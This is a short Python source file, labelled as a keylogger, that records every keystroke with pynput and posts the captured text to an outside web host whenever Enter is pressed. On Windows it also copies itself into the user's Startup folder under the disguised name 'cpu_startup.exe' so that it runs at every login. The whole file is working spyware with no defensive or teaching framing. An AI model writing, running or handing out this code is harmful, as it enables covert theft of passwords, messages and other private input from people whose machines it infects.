# keylogger

from pynput import keyboard
from requests import post
from platform import system
import os
from time import sleep
import sys
import shutil
from threading import Thread

send_data = ""

def send(key):
    print(key)
    post("https://grvn43-5000.csb.app/", {'key': str(key)})

if os.name == "nt":
    username = os.getlogin()
    startup_folder = os.path.join("C:\\Users", username, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    destination = os.path.join(startup_folder, "cpu_startup.exe")
    shutil.copy(sys.executable, destination)


change_lang = False


def on_press(key):
    if key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        global change_lang
        change_lang = True
    if (key == keyboard.Key.shift_r or key == keyboard.Key.shift_l) and change_lang:
        change_lang = False
        python = sys.executable
        os.execl(python, python, *sys.argv)

    try:
        k = key.char
    except AttributeError:
        k = key
        if k == keyboard.Key.enter:
            k = ""
            global send_data
            send_data += '<br />'
            send(send_data)
            send_data = ""
        elif k == keyboard.Key.space:
            k = ' &nbsp;'
        elif k == keyboard.Key.delete:
            k = 'Delete '
        elif k == keyboard.Key.tab:
            k = ' &nbsp;&nbsp;&nbsp;&nbsp;'
        elif k == keyboard.Key.backspace:
            k = ""
            send_data = send_data[:-1]
        elif k == keyboard.Key.caps_lock:
            k = ""
        elif k == keyboard.Key.shift_r or k == keyboard.Key.shift_l:
            k = " shift"
        elif k == keyboard.Key.ctrl_r or k == keyboard.Key.ctrl_l:
            k = " ctrl"
    
    if str(k).encode() == b"\x13":
        k = " + s "
    elif str(k).encode() == b"\x18":
        k = " + x "
    elif str(k).encode() == b"\x1a":
        k = " + z "
    elif str(k).encode() == b"\x01":
        k = " + a "
    elif str(k).encode() == b"\x16":
        k = " + v "
    elif str(k).encode() == b"\x02":
        k = " + b "
    elif str(k).encode() == b"\x0e":
        k = " + n "
    elif str(k).encode() == b"\r":
        k = " + m "
    elif str(k).encode() == b"\x04":
        k = " + d "
    elif str(k).encode() == b"\x06":
        k = " + f "
    elif str(k).encode() == b"\x07":
        k = " + g "
    elif str(k).encode() == b"\x08":
        k = " + h "
    elif str(k).encode() == b"\n":
        k = " + j "
    elif str(k).encode() == b"\x0b":
        k = " + k "
    elif str(k).encode() == b"\x0c":
        k = " + l "
    elif str(k).encode() == b"\x11":
        k = " + q "
    elif str(k).encode() == b"\x17":
        k = " + w "
    elif str(k).encode() == b"\x05":
        k = " + e "
    elif str(k).encode() == b"\x12":
        k = " + r "
    elif str(k).encode() == b"\x14":
        k = " + t "
    elif str(k).encode() == b"\x19":
        k = " + y "
    elif str(k).encode() == b"\x15":
        k = " + u "
    elif str(k).encode() == b"\t":
        k = " + i "
    elif str(k).encode() == b"\x03":
        k = " + c "
    elif str(k).encode() == b"\x0f":
        k = " + o "
    elif str(k).encode() == b"\x10":
        k = " + p "
    if str(k) and str(key) != "None":
        send_data += str(k)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
